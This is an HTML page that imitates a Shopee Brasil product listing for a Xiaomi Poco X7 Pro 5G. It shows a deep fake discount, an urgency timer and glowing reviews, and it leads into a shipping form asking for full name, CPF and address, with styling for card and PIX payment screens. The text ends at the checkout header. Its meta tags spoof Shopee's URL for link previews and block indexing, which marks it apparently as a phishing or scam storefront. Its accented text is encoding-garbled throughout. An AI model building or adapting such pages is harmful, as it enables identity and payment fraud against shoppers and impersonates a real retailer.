<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">

<!-- META TAGS PARA BOTS (SEM REDIRECIONAR USU√ÅRIOS) -->
<meta name="robots" content="noindex, nofollow">
<meta property="og:url" content="https://shopee.com.br/product/1078992312/23292818042">
<meta property="og:type" content="product">
<meta property="og:title" content="Xiaomi Poco X7 PRO 5G - Lote Global 2026">
<meta property="og:description" content="Xiaomi Poco X7 PRO 5G com 512GB/12GB RAM - Frete Gr√°tis - Compre na Shopee">
<meta property="og:image" content="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg">
<link rel="canonical" href="https://shopee.com.br/product/1078992312/23292818042">

<title>Xiaomi Poco X7 PRO 5G - Lote Global 2026 | Shopee Brasil</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<script src="https://cdn.tailwindcss.com"></script>

<style>
:root {
--shopee: #ee4d2d;
--shopee-dark: #d73211;
--shopee-light: #fff5f1;
--btn-green: #00bfa5;
--bg-gray: #f5f5f5;
--text-main: #222;
--text-light: #757575;
}

* {
margin: 0;
padding: 0;
box-sizing: border-box;
-webkit-tap-highlight-color: transparent;
font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
}

body {
background: var(--bg-gray);
color: var(--text-main);
overflow-x: hidden;
padding-bottom: 60px;
}

.page {
display: none;
}

.page.active {
display: block !important;
}

/* HEADER SHOPEE */
.top-nav {
background: white;
padding: 8px 12px;
display: flex;
align-items: center;
position: sticky;
top: 0;
z-index: 1000;
height: 54px;
gap: 10px;
box-shadow: 0 1px 3px rgba(0,0,0,0.1);
}

.back-icon {
color: var(--shopee);
font-size: 20px;
cursor: pointer;
}

.search-container {
flex: 1;
background: #f0f0f0;
display: flex;
align-items: center;
padding: 6px 12px;
border-radius: 2px;
}

.search-container i {
color: #888;
font-size: 14px;
margin-right: 8px;
}

.search-container input {
background: transparent;
border: none;
outline: none;
font-size: 14px;
width: 100%;
color: #333;
}

.cart-icon {
color: var(--shopee);
font-size: 20px;
position: relative;
}

.cart-badge {
position: absolute;
top: -8px;
right: -8px;
background: var(--shopee);
color: white;
border-radius: 50%;
width: 18px;
height: 18px;
font-size: 10px;
display: flex;
align-items: center;
justify-content: center;
font-weight: bold;
}

/* SELO FRETE GR√ÅTIS */
.frete-gratis-banner {
background: linear-gradient(90deg, #00bfa5, #00d4aa);
color: white;
padding: 8px 15px;
display: flex;
align-items: center;
justify-content: center;
gap: 8px;
font-size: 13px;
font-weight: bold;
}

.frete-gratis-banner i {
font-size: 16px;
animation: bounce 2s infinite;
}

@keyframes bounce {
0%, 100% { transform: translateY(0); }
50% { transform: translateY(-5px); }
}

/* CARROSSEL */
.main-slider {
position: relative;
width: 100%;
background: #fff;
aspect-ratio: 1/1;
}

.carousel-track {
display: flex;
overflow-x: auto;
scroll-snap-type: x mandatory;
height: 100%;
}

.carousel-track::-webkit-scrollbar {
display: none;
}

.carousel-item {
min-width: 100%;
scroll-snap-align: start;
display: flex;
align-items: center;
justify-content: center;
}

.carousel-item img {
width: 100%;
height: 100%;
object-fit: contain;
}

.carousel-index {
position: absolute;
bottom: 15px;
right: 15px;
background: rgba(0, 0, 0, 0.5);
color: #fff;
padding: 3px 10px;
border-radius: 12px;
font-size: 11px;
}

/* VARIANTES MINI */
.variantes-mini {
display: flex;
gap: 8px;
padding: 10px 0;
overflow-x: auto;
}

.variantes-mini::-webkit-scrollbar {
display: none;
}

.variante-mini-item {
min-width: 60px;
height: 60px;
border: 2px solid #e0e0e0;
border-radius: 4px;
overflow: hidden;
cursor: pointer;
}

.variante-mini-item.active {
border-color: var(--shopee);
}

.variante-mini-item img {
width: 100%;
height: 100%;
object-fit: cover;
}

/* FLASH SALE */
.flash-sale {
background: linear-gradient(90deg, #ff4d2d, #ff8a00);
color: white;
padding: 12px 15px;
display: flex;
align-items: center;
justify-content: space-between;
font-weight: bold;
}

.flash-sale-left {
display: flex;
align-items: center;
gap: 8px;
font-size: 13px;
text-transform: uppercase;
}

.flash-sale-left i {
animation: flash 1.5s infinite;
}

@keyframes flash {
0%, 100% { opacity: 1; }
50% { opacity: 0.5; }
}

.timer {
display: flex;
align-items: center;
gap: 3px;
font-size: 11px;
}

.timer-label {
font-size: 10px;
margin-right: 5px;
}

.timer-unit {
background: #333;
color: #fff;
padding: 3px 5px;
border-radius: 3px;
min-width: 26px;
text-align: center;
font-size: 13px;
font-weight: bold;
}

.timer-separator {
margin: 0 2px;
}

/* PRODUCT INFO */
.product-card {
background: white;
padding: 15px;
margin-bottom: 8px;
}

.price-section {
display: flex;
align-items: center;
gap: 10px;
margin-bottom: 8px;
}

.old-price {
color: #999;
text-decoration: line-through;
font-size: 14px;
}

.discount-percent {
background: var(--shopee-light);
color: var(--shopee);
font-size: 11px;
padding: 2px 6px;
border-radius: 2px;
font-weight: bold;
}

.price-row {
color: var(--shopee);
font-size: 32px;
font-weight: 500;
margin-bottom: 5px;
}

.vendidos {
color: #757575;
font-size: 12px;
display: flex;
align-items: center;
gap: 5px;
}

.product-title {
font-size: 15px;
line-height: 1.5;
margin-top: 10px;
color: #222;
}

.tag-indicado {
background: var(--shopee);
color: white;
font-size: 10px;
padding: 2px 5px;
border-radius: 2px;
margin-right: 4px;
font-weight: bold;
}

/* FRETE INFO */
.frete-info {
background: white;
padding: 12px 15px;
margin-bottom: 8px;
display: flex;
align-items: center;
gap: 10px;
}

.frete-info i {
color: var(--btn-green);
font-size: 18px;
}

.frete-text {
flex: 1;
}

.frete-text .original {
text-decoration: line-through;
color: #999;
font-size: 12px;
}

.frete-text .gratis {
color: var(--btn-green);
font-weight: bold;
font-size: 13px;
}

.frete-text .cupom {
color: #757575;
font-size: 11px;
}

/* SHOP SECTION */
.shop-card {
background: white;
padding: 15px;
margin-bottom: 8px;
display: flex;
align-items: center;
justify-content: space-between;
}

.shop-info {
display: flex;
align-items: center;
gap: 12px;
}

.shop-logo {
width: 45px;
height: 45px;
border-radius: 50%;
border: 1px solid #eee;
}

.shop-name {
font-weight: bold;
font-size: 14px;
display: flex;
align-items: center;
gap: 5px;
}

.shop-status {
font-size: 11px;
color: #888;
}

.btn-shop {
border: 1px solid var(--shopee);
color: var(--shopee);
padding: 6px 15px;
font-size: 12px;
border-radius: 2px;
text-decoration: none;
font-weight: 500;
}

/* SECTIONS */
.section-box {
background: white;
margin-bottom: 8px;
}

.section-header-tab {
padding: 15px;
display: flex;
justify-content: space-between;
align-items: center;
cursor: pointer;
border-bottom: 1px solid #f5f5f5;
}

.section-header-tab span {
font-weight: bold;
font-size: 13px;
text-transform: uppercase;
color: #222;
}

.section-content {
padding: 15px;
display: none;
}

.section-content.active {
display: block;
}

.spec-table {
width: 100%;
border-collapse: collapse;
font-size: 13px;
}

.spec-table td {
padding: 10px 0;
border-bottom: 1px solid #f9f9f9;
}

.spec-key {
color: #757575;
width: 45%;
}

.spec-val {
color: #222;
font-weight: 500;
}

.desc-text {
font-size: 13px;
line-height: 1.8;
color: #555;
white-space: pre-line;
}

/* REVIEWS */
.review-section-title {
background: white;
padding: 12px 15px;
display: flex;
justify-content: space-between;
align-items: center;
border-bottom: 1px solid #f2f2f2;
}

.review-item {
background: white;
padding: 15px;
border-bottom: 1px solid #f2f2f2;
}

.review-user {
font-size: 12px;
font-weight: 500;
margin-bottom: 5px;
}

.stars {
color: var(--shopee);
font-size: 10px;
margin-bottom: 8px;
}

.review-text {
font-size: 13px;
margin-bottom: 10px;
line-height: 1.5;
}

.review-imgs {
display: flex;
gap: 8px;
overflow-x: auto;
}

.review-imgs img {
width: 85px;
height: 85px;
border-radius: 4px;
object-fit: cover;
}

/* FOOTER BUTTONS */
.footer {
position: fixed;
bottom: 0;
width: 100%;
height: 54px;
background: white;
display: flex;
border-top: 1px solid #eee;
z-index: 1100;
box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
}

.footer-icon-btn {
width: 60px;
display: flex;
flex-direction: column;
align-items: center;
justify-content: center;
border-right: 1px solid #eee;
color: #00bfa5;
text-decoration: none;
cursor: pointer;
}

.footer-icon-btn i {
font-size: 18px;
}

.footer-icon-btn span {
font-size: 9px;
margin-top: 3px;
color: #555;
}

.btn-add-cart {
flex: 1;
background: rgba(0, 191, 165, 0.1);
color: #00bfa5;
border: none;
font-size: 12px;
display: flex;
flex-direction: column;
align-items: center;
justify-content: center;
border-right: 1px solid #eee;
cursor: pointer;
}

.btn-add-cart i {
font-size: 18px;
margin-bottom: 2px;
}

.btn-buy-now {
flex: 1.2;
background: var(--shopee);
color: white;
border: none;
font-weight: bold;
font-size: 15px;
cursor: pointer;
}

/* MODAL */
.modal {
display: none;
position: fixed;
inset: 0;
background: rgba(0, 0, 0, 0.6);
z-index: 2000;
}

.modal-content {
position: absolute;
bottom: 0;
width: 100%;
background: #fff;
border-radius: 12px 12px 0 0;
max-height: 85vh;
overflow-y: auto;
padding: 15px;
}

.variant-btn {
background: #f5f5f5;
border: 1px solid #e0e0e0;
padding: 8px 12px;
border-radius: 2px;
font-size: 12px;
cursor: pointer;
transition: all 0.2s;
}

.variant-btn.selected {
border-color: var(--shopee);
color: var(--shopee);
background: var(--shopee-light);
}

/* CHECKOUT STYLES */
.checkout-header {
background: white;
padding: 12px 15px;
display: flex;
align-items: center;
gap: 12px;
border-bottom: 1px solid #f0f0f0;
position: sticky;
top: 0;
z-index: 50;
}

.endereco-card {
background: white;
padding: 15px;
border-bottom: 2px dashed var(--shopee);
margin-bottom: 8px;
display: flex;
gap: 10px;
}

.produto-checkout {
background: white;
padding: 15px;
margin-bottom: 8px;
}

.loja-header {
display: flex;
align-items: center;
gap: 8px;
margin-bottom: 12px;
padding-bottom: 10px;
border-bottom: 1px solid #f0f0f0;
}

.produto-info {
display: flex;
gap: 12px;
}

.produto-img {
width: 80px;
height: 80px;
border-radius: 4px;
border: 1px solid #eee;
}

.produto-detalhes {
flex: 1;
}

.produto-nome {
font-size: 13px;
margin-bottom: 5px;
line-height: 1.4;
}

.produto-variacao {
color: #757575;
font-size: 11px;
margin-bottom: 8px;
}

.produto-preco {
color: var(--shopee);
font-weight: bold;
font-size: 16px;
}

.produto-quantidade {
color: #757575;
font-size: 11px;
margin-top: 5px;
}

/* SEGUROS */
.seguros-section {
background: white;
padding: 15px;
margin-bottom: 8px;
}

.seguro-titulo {
font-size: 10px;
font-weight: bold;
color: #999;
text-transform: uppercase;
margin-bottom: 15px;
letter-spacing: 0.5px;
}

.seguro-item {
display: flex;
justify-content: space-between;
align-items: center;
padding: 12px 0;
}

.seguro-item:not(:last-child) {
border-bottom: 1px solid #f5f5f5;
}

.seguro-info {
flex: 1;
}

.seguro-nome {
font-size: 13px;
font-weight: 500;
margin-bottom: 3px;
}

.seguro-desc {
font-size: 11px;
color: #757575;
}

.badge-recomendado {
background: var(--shopee);
color: white;
font-size: 9px;
padding: 2px 6px;
border-radius: 3px;
margin-left: 6px;
font-weight: bold;
}

/* SWITCH */
.switch {
position: relative;
display: inline-block;
width: 44px;
height: 24px;
}

.switch input {
opacity: 0;
width: 0;
height: 0;
}

.slider {
position: absolute;
cursor: pointer;
top: 0;
left: 0;
right: 0;
bottom: 0;
background-color: #ccc;
transition: .3s;
border-radius: 24px;
}

.slider:before {
position: absolute;
content: "";
height: 18px;
width: 18px;
left: 3px;
bottom: 3px;
background-color: white;
transition: .3s;
border-radius: 50%;
}

input:checked + .slider {
background-color: var(--shopee);
}

input:checked + .slider:before {
transform: translateX(20px);
}

/* PAGAMENTO */
.pagamento-section {
background: white;
padding: 15px;
margin-bottom: 8px;
}

.pagamento-opcao {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 0;
cursor: pointer;
}

.pagamento-opcao:not(:last-of-type) {
border-bottom: 1px solid #f5f5f5;
}

.pagamento-left {
display: flex;
align-items: center;
gap: 12px;
}

.pagamento-left i {
font-size: 22px;
}

.pix-icon {
color: #00bfa5;
}

.card-icon {
color: var(--shopee);
}

.pagamento-text {
font-size: 14px;
}

.desconto-pix {
color: var(--shopee);
font-weight: bold;
font-size: 10px;
margin-left: 5px;
}

.card-form {
margin-top: 15px;
padding-top: 15px;
border-top: 1px solid #f0f0f0;
}

.security-badge {
display: flex;
align-items: center;
gap: 8px;
background: #f0f9ff;
padding: 10px;
border-radius: 4px;
margin-bottom: 12px;
border-left: 3px solid #00bfa5;
}

.security-badge i {
color: #00bfa5;
font-size: 16px;
}

.security-badge span {
font-size: 11px;
color: #00bfa5;
font-weight: 500;
}

.form-input {
width: 100%;
padding: 12px;
border: 1px solid #e0e0e0;
border-radius: 4px;
font-size: 13px;
margin-bottom: 10px;
outline: none;
}

.form-input:focus {
border-color: var(--shopee);
}

.form-row {
display: flex;
gap: 10px;
}

/* RESUMO */
.resumo-section {
background: white;
padding: 15px;
margin-bottom: 8px;
}

.resumo-line {
display: flex;
justify-content: space-between;
padding: 8px 0;
font-size: 12px;
color: #757575;
}

.resumo-line.total {
border-top: 1px solid #f0f0f0;
padding-top: 12px;
margin-top: 8px;
font-size: 14px;
font-weight: bold;
color: #222;
}

.resumo-line.total .valor {
color: var(--shopee);
font-size: 18px;
}

.cupom-section {
background: white;
padding: 15px;
margin-bottom: 8px;
display: flex;
align-items: center;
justify-content: space-between;
cursor: pointer;
}

.cupom-left {
display: flex;
align-items: center;
gap: 10px;
}

.cupom-left i {
color: var(--shopee);
font-size: 18px;
}

.cupom-text {
font-size: 14px;
color: #222;
}

.cupom-placeholder {
color: #999;
font-size: 13px;
}

/* FOOTER CHECKOUT */
.footer-checkout {
position: fixed;
bottom: 0;
width: 100%;
background: white;
border-top: 1px solid #e0e0e0;
padding: 12px 15px;
display: flex;
align-items: center;
justify-content: space-between;
z-index: 50;
box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
}

.footer-total {
text-align: right;
flex: 1;
padding-right: 15px;
}

.footer-total-label {
font-size: 10px;
color: #757575;
}

.footer-total-valor {
color: var(--shopee);
font-weight: bold;
font-size: 20px;
}

.footer-total-economia {
font-size: 10px;
color: var(--btn-green);
margin-top: 2px;
}

.btn-fazer-pedido {
background: var(--shopee);
color: white;
border: none;
padding: 12px 30px;
font-size: 14px;
font-weight: bold;
border-radius: 4px;
cursor: pointer;
text-transform: uppercase;
}

/* P√ÅGINA PIX */
.pix-page {
background: white;
min-height: 100vh;
padding: 20px;
}

.pix-success-icon {
width: 70px;
height: 70px;
background: var(--btn-green);
border-radius: 50%;
display: flex;
align-items: center;
justify-content: center;
margin: 0 auto 20px;
}

.pix-success-icon i {
color: white;
font-size: 35px;
}

.pix-titulo {
text-align: center;
font-size: 20px;
font-weight: bold;
text-transform: uppercase;
margin-bottom: 10px;
}

.pix-subtitulo {
text-align: center;
color: #757575;
font-size: 13px;
margin-bottom: 25px;
}

.pix-qr-container {
background: #f8f8f8;
border: 2px dashed var(--btn-green);
border-radius: 12px;
padding: 25px;
text-align: center;
margin-bottom: 20px;
}

.pix-valor {
color: var(--btn-green);
font-size: 32px;
font-weight: bold;
margin-bottom: 20px;
}

.pix-qr {
width: 200px;
height: 200px;
margin: 0 auto 20px;
background: white;
padding: 10px;
border-radius: 8px;
}

.btn-copiar-pix {
width: 100%;
background: var(--btn-green);
color: white;
border: none;
padding: 15px;
font-size: 14px;
font-weight: bold;
border-radius: 8px;
cursor: pointer;
text-transform: uppercase;
}

.pix-security {
background: #fff3e0;
border-left: 3px solid #ff9800;
padding: 12px;
border-radius: 4px;
margin-top: 20px;
}

.pix-security-title {
display: flex;
align-items: center;
gap: 8px;
color: #ff9800;
font-weight: bold;
font-size: 12px;
margin-bottom: 8px;
}

.pix-security-text {
color: #757575;
font-size: 11px;
line-height: 1.6;
}

.pix-info {
background: #f0f9ff;
border-left: 3px solid #00bfa5;
padding: 12px;
border-radius: 4px;
margin-top: 15px;
}

.pix-info-title {
display: flex;
align-items: center;
gap: 8px;
color: #00bfa5;
font-weight: bold;
font-size: 11px;
margin-bottom: 8px;
}

.pix-info-text {
color: #555;
font-size: 11px;
line-height: 1.6;
}

/* ANIMA√á√ïES */
@keyframes fadeIn {
from { opacity: 0; transform: translateY(10px); }
to { opacity: 1; transform: translateY(0); }
}

.animate-fadeIn {
animation: fadeIn 0.3s ease-in-out;
}

/* RESPONSIVO */
@media (max-width: 360px) {
.price-row { font-size: 28px; }
.timer-unit { min-width: 22px; font-size: 11px; }
}
</style>

</head>

<body>

<!-- P√ÅGINA VITRINE -->
<div id="p-vitrine" class="page active">
<div class="top-nav">
<i class="fas fa-arrow-left back-icon" onclick="window.location.href='https://shopee.com.br'"></i>
<div class="search-container">
<i class="fas fa-search"></i>
<input type="text" placeholder="Buscar na Shopee" readonly>
</div>
<i class="fas fa-shopping-cart cart-icon">
<span class="cart-badge">13</span>
</i>
</div>

<!-- BANNER FRETE GR√ÅTIS -->
<div class="frete-gratis-banner">
<i class="fas fa-shipping-fast"></i>
<span>FRETE GR√ÅTIS acima de R$10</span>
</div>

<!-- CARROSSEL -->
<div class="main-slider">
<div class="carousel-track" id="mainTrack">
<div class="carousel-item"><img src="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg"></div>
<div class="carousel-item"><img src="https://i.postimg.cc/brs6kkrv/D-NQ-NP-970510-MLA101985218069-122025-O.webp"></div>
<div class="carousel-item"><img src="https://i.postimg.cc/v84FW6pL/c1cb1b668aeef4266b070782b5b43c47.webp"></div>
<div class="carousel-item"><img src="https://i.postimg.cc/sfbFKgzD/gsmarena-002.jpg"></div>
<div class="carousel-item"><img src="https://i.postimg.cc/qvdPVDgW/gsmarena-001.jpg"></div>
<div class="carousel-item"><img src="https://i.postimg.cc/bvy4dGxN/xiaomi-poco-x7-pro-2.jpg"></div>
<div class="carousel-item"><img src="https://i.postimg.cc/6QMgZ9c1/IMG-20260210-142449.jpg"></div>
</div>
<div class="carousel-index" id="carouselNum">1/7</div>
</div>

<!-- VARIANTES MINI -->
<div class="product-card" style="padding: 10px 15px;">
<div class="variantes-mini">
<div class="variante-mini-item active">
<img src="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg">
</div>
<div class="variante-mini-item">
<img src="https://i.postimg.cc/brs6kkrv/D-NQ-NP-970510-MLA101985218069-122025-O.webp">
</div>
<div class="variante-mini-item">
<img src="https://i.postimg.cc/v84FW6pL/c1cb1b668aeef4266b070782b5b43c47.webp">
</div>
<div class="variante-mini-item">
<img src="https://i.postimg.cc/sfbFKgzD/gsmarena-002.jpg">
</div>
<div class="variante-mini-item">
<img src="https://i.postimg.cc/qvdPVDgW/gsmarena-001.jpg">
</div>
<div class="variante-mini-item">
<img src="https://i.postimg.cc/bvy4dGxN/xiaomi-poco-x7-pro-2.jpg">
</div>
<div class="variante-mini-item">
<img src="https://i.postimg.cc/6QMgZ9c1/IMG-20260210-142449.jpg">
</div>
</div>
</div>

<!-- FLASH SALE -->
<div class="flash-sale">
<div class="flash-sale-left">
<i class="fas fa-bolt"></i>
<span>TERMINA EM</span>
</div>
<div class="timer">
<span class="timer-unit" id="h">00</span>
<span class="timer-separator">:</span>
<span class="timer-unit" id="m">00</span>
<span class="timer-separator">:</span>
<span class="timer-unit" id="s">00</span>
</div>
</div>

<!-- PRODUCT INFO -->
<div class="product-card">
<div class="price-section">
<div class="old-price">R$ 3.499,00</div>
<div class="discount-percent">-63%</div>
</div>
<div class="price-row">R$ 1.299,00</div>
<div class="vendidos">
<span>2mil+ Vendidos</span>
<i class="fas fa-heart" style="color: #ff5252; margin-left: auto;"></i>
</div>
<h1 class="product-title">
<span class="tag-indicado">Indicado</span>
Xiaomi Poco X7 PRO 5G Armazenamento 512GB-256GB + 8GB-12GB RAM, Processador Dimensity 8400-Ultra
</h1>
</div>

<!-- FRETE INFO -->
<div class="frete-info">
<i class="fas fa-truck"></i>
<div class="frete-text">
<div class="gratis">Frete gr√°tis</div>
<div class="cupom">
<span class="original">R$ 26,30</span> R$ 0,00 com cupom
</div>
</div>
<i class="fas fa-chevron-right" style="color: #ccc; font-size: 14px;"></i>
</div>

<!-- SHOP -->
<div class="shop-card">
<div class="shop-info">
<img src="https://down-br.img.susercontent.com/file/br-11134216-7r98o-m8ktdfse9yq937" class="shop-logo">
<div>
<div class="shop-name">
Onix Oficial
<i class="fas fa-check-circle" style="color:#2673dd; font-size:12px;"></i>
</div>
<div class="shop-status">Ativo h√° 3 minutos</div>
</div>
</div>
<a href="#" class="btn-shop">Ver P√°gina</a>
</div>

<!-- ESPECIFICA√á√ïES -->
<div class="section-box">
<div class="section-header-tab" onclick="toggleSection('spec-content')">
<span>Especifica√ß√µes do Produto</span>
<i class="fas fa-chevron-down"></i>
</div>
<div class="section-content" id="spec-content">
<table class="spec-table">
<tr><td class="spec-key">Marca</td><td class="spec-val">Xiaomi</td></tr>
<tr><td class="spec-key">Modelo</td><td class="spec-val">Poco X7 Pro 5G</td></tr>
<tr><td class="spec-key">Processador</td><td class="spec-val">MediaTek Dimensity 8400-Ultra</td></tr>
<tr><td class="spec-key">RAM</td><td class="spec-val">12GB LPDDR5X</td></tr>
<tr><td class="spec-key">Armazenamento</td><td class="spec-val">512GB UFS 4.0</td></tr>
<tr><td class="spec-key">Tela</td><td class="spec-val">6.67" AMOLED 120Hz</td></tr>
<tr><td class="spec-key">Bateria</td><td class="spec-val">6000mAh</td></tr>
<tr><td class="spec-key">Carregamento</td><td class="spec-val">90W HyperCharge</td></tr>
<tr><td class="spec-key">C√¢mera Principal</td><td class="spec-val">50MP Sony LYT-600 OIS</td></tr>
<tr><td class="spec-key">5G</td><td class="spec-val">Sim - Dual SIM</td></tr>
<tr><td class="spec-key">NFC</td><td class="spec-val">Sim</td></tr>
<tr><td class="spec-key">Garantia</td><td class="spec-val">12 Meses</td></tr>
</table>
</div>
</div>

<!-- DESCRI√á√ÉO -->
<div class="section-box">
<div class="section-header-tab" onclick="toggleSection('desc-content')">
<span>Descri√ß√£o do Produto</span>
<i class="fas fa-chevron-down"></i>
</div>
<div class="section-content desc-text" id="desc-content">
üî• XIAOMI POCO X7 PRO 5G - LOTE GLOBAL 2026

üì± TELA AMOLED PREMIUM
‚Ä¢ Display 6.67" AMOLED CrystalRes
‚Ä¢ Taxa de 120Hz ultra fluida
‚Ä¢ Resolu√ß√£o 2K+ (2712 x 1220)
‚Ä¢ Brilho 3200 nits
‚Ä¢ Gorilla Glass Victus 2

‚ö° PERFORMANCE EXTREMA
‚Ä¢ Dimensity 8400-Ultra 4nm
‚Ä¢ 12GB RAM LPDDR5X
‚Ä¢ 512GB UFS 4.0
‚Ä¢ Sistema de resfriamento LiquidCool

üì∏ C√ÇMERAS PROFISSIONAIS
‚Ä¢ 50MP Sony LYT-600 com OIS
‚Ä¢ Ultra-wide 8MP 120¬∞
‚Ä¢ Frontal 20MP
‚Ä¢ Grava√ß√£o 4K 60fps

üîã BATERIA GIGANTE
‚Ä¢ 6000mAh
‚Ä¢ Carregamento 90W (25min 0-100%)
‚Ä¢ Modo economia extrema

üéÆ GAMING AVAN√áADO
‚Ä¢ Game Turbo 7.0
‚Ä¢ 2160Hz touch response
‚Ä¢ Dolby Atmos

üåê CONECTIVIDADE
‚Ä¢ 5G Dual SIM
‚Ä¢ Wi-Fi 6E
‚Ä¢ Bluetooth 5.4
‚Ä¢ NFC
‚Ä¢ USB-C 3.2

üì¶ CONTE√öDO
‚Ä¢ Poco X7 Pro 5G
‚Ä¢ Carregador 90W
‚Ä¢ Cabo USB-C
‚Ä¢ Capinha
‚Ä¢ Pel√≠cula aplicada

‚úÖ GARANTIA
‚Ä¢ 100% Original
‚Ä¢ 12 meses nacional
‚Ä¢ Nota fiscal inclu√≠da
</div>
</div>

<div class="review-section-title" style="display: block; padding-bottom: 5px;">
<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px;">
<span style="font-weight:bold; font-size:13px; color:#222;">AVALIA√á√ïES DO PRODUTO (19.566)</span>
<a href="https://shopee.com.br/shop/1078992312/item/23292818042/rating" style="color:var(--shopee); font-size:12px; text-decoration:none;">Ver Tudo ></a>
</div>
<div style="display: flex; align-items: center; gap: 5px;">
<div class="stars" style="margin-bottom: 0; font-size: 12px;">‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê</div>
<span style="color: var(--shopee); font-size: 13px; font-weight: bold;">5.0</span>
<span style="color: #757575; font-size: 13px;">(20.920 resenhas)</span>
</div>
</div>

<div class="review-item">
<p class="review-user">a***n</p>
<div class="stars">‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê</div>
<p class="review-text">Sensacional! Chegou antes do prazo e muito bem lacrado. O desempenho √© de outro n√≠vel!</p>
<div class="review-imgs">
<img src="https://i.postimg.cc/ctv07Hv2/br-11134103-81ztc-mk5oi70vvpxf33.webp">
<img src="https://i.postimg.cc/qNV4npp0/br-11134103-81ztc-mju9ycl4xfd241.webp">
<img src="https://i.postimg.cc/2b6Dm678/br-11134103-81ztc-mjoqss93c3k126.webp">
</div>
</div>

<div class="review-item">
<p class="review-user">g***v</p>
<div class="stars">‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê</div>
<p class="review-text">Aparelho lind√≠ssimo! A cor √© diferenciada e o HyperOS 2 est√° muito fluido. Vale cada centavo.</p>
<div class="review-imgs">
<img src="https://i.postimg.cc/qzndpWyb/br-11134103-81ztc-mke1j4czd34324.webp">
<img src="https://i.postimg.cc/5XSdCvPw/br-11134103-81z1k-miiog3qhwzcz53.webp">
</div>
</div>

<!-- FOOTER -->
<div class="footer">
<a href="#" class="footer-icon-btn">
<i class="far fa-comment-dots"></i>
<span>Conversar</span>
</a>
<button class="btn-add-cart" onclick="openModal()">
<i class="fas fa-cart-plus"></i>
<span>Carrinho</span>
</button>
<button class="btn-buy-now" onclick="openModal()">Compre agora</button>
</div>
</div>

<!-- MODAL VARIANTES -->
<div id="modal-variants" class="modal">
<div class="modal-content">
<div class="flex gap-4 mb-4 relative border-b pb-4">
<img src="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg" class="w-24 h-24 border rounded">
<div class="flex flex-col justify-end">
<p class="text-orange-600 text-2xl font-bold" id="v-price">R$ 1.299,00</p>
<div class="old-price">R$ 3.499,00</div>
<p class="text-[10px] text-gray-400">Estoque: 87</p>
</div>
<i onclick="closeModal()" class="fas fa-times absolute right-0 top-0 text-gray-300 p-2 cursor-pointer text-xl"></i>
</div>

<p class="text-xs font-bold mb-3 text-gray-500">10 Varia√ß√µes Dispon√≠veis</p>
<p class="text-xs font-bold mb-2 text-gray-500">COR</p>
<div class="flex flex-wrap gap-2 mb-4">
<button class="variant-btn selected" onclick="selColor(this, 'Preto Onyx')">Preto Onyx</button>
<button class="variant-btn" onclick="selColor(this, 'Verde Poco')">Verde Poco</button>
<button class="variant-btn" onclick="selColor(this, 'Iron Man Edition')">Iron Man Edition</button>
<button class="variant-btn" onclick="selColor(this, 'Amarelo Poco')">Amarelo Poco</button>
</div>

<p class="text-xs font-bold mb-2 text-gray-500">CAPACIDADE</p>
<div class="flex flex-wrap gap-2 mb-8">
<button class="variant-btn" onclick="selSize(this, 999)">256GB / 8GB</button>
<button class="variant-btn selected" onclick="selSize(this, 1299)">512GB / 12GB</button>
<button class="variant-btn" onclick="selSize(this, 1699)">1TB / 16GB</button>
</div>

<div class="flex justify-between items-center mb-6 border-t pt-4">
<span class="text-sm font-bold">Quantidade</span>
<div class="flex border rounded overflow-hidden">
<button class="px-3 py-2 bg-gray-100" onclick="adjQty(-1)">-</button>
<input id="qty" value="1" readonly class="w-12 text-center text-sm">
<button class="px-3 py-2 bg-gray-100" onclick="adjQty(1)">+</button>
</div>
</div>

<button onclick="comprarAgora()" class="w-full bg-[#ee4d2d] text-white py-3 rounded-sm font-bold uppercase">Confirmar</button>
</div>
</div>

<!-- P√ÅGINA ENVIO -->
<div id="p-envio" class="page">
<div class="checkout-header">
<i class="fas fa-arrow-left text-orange-600 cursor-pointer" onclick="backToVitrine()"></i>
<h1 class="text-base font-medium">Informa√ß√µes de Envio</h1>
</div>

<div style="padding: 15px;">
<div class="security-badge" style="margin-bottom: 15px;">
<i class="fas fa-shield-alt"></i>
<span>Seus dados est√£o protegidos por ShopeePay</span>
</div>

<div style="background: white; padding: 15px; border-radius: 4px;">
<input type="text" id="in-nome" placeholder="Nome Completo" class="form-input">

<div style="display: flex; gap: 10px; margin-bottom: 10px;">
<input type="tel" id="in-cep" placeholder="CEP" maxlength="9" oninput="mCEP(this)" class="form-input" style="flex: 1; margin: 0;">
<button onclick="buscarCEP()" style="background: #333; color: white; padding: 12px 20px; border-radius: 4px; font-size: 11px; font-weight: bold; border: none; cursor: pointer;">BUSCAR</button>
</div>

<input type="tel" id="in-cpf" placeholder="CPF do Titular" maxlength="14" oninput="mCPF(this)" class="form-input">
<input type="text" id="in-rua" placeholder="Endere√ßo (Rua e Bairro)" class="form-input">

<div class="form-row">
<input type="text" id="in-num" placeholder="N¬∫" class="form-input" style="width: 80px; margin: 0;">
<input type="text" id="in-cid" placeholder="Cidade / UF" class="form-input" style="flex: 1; margin: 0;">
</div>
</div>

<button onclick="goCheckout()" style="width: 100%; background: var(--shopee); color: white; border: none; padding: 15px; border-radius: 4px; font-weight: bold; text-transform: uppercase; margin-top: 15px; cursor: pointer;">Continuar</button>
</div>
</div>

<!-- P√ÅGINA CHECKOUT -->
<div id="p-checkout" class="page" style="padding-bottom: 80px;">
<div class="checkout-header">
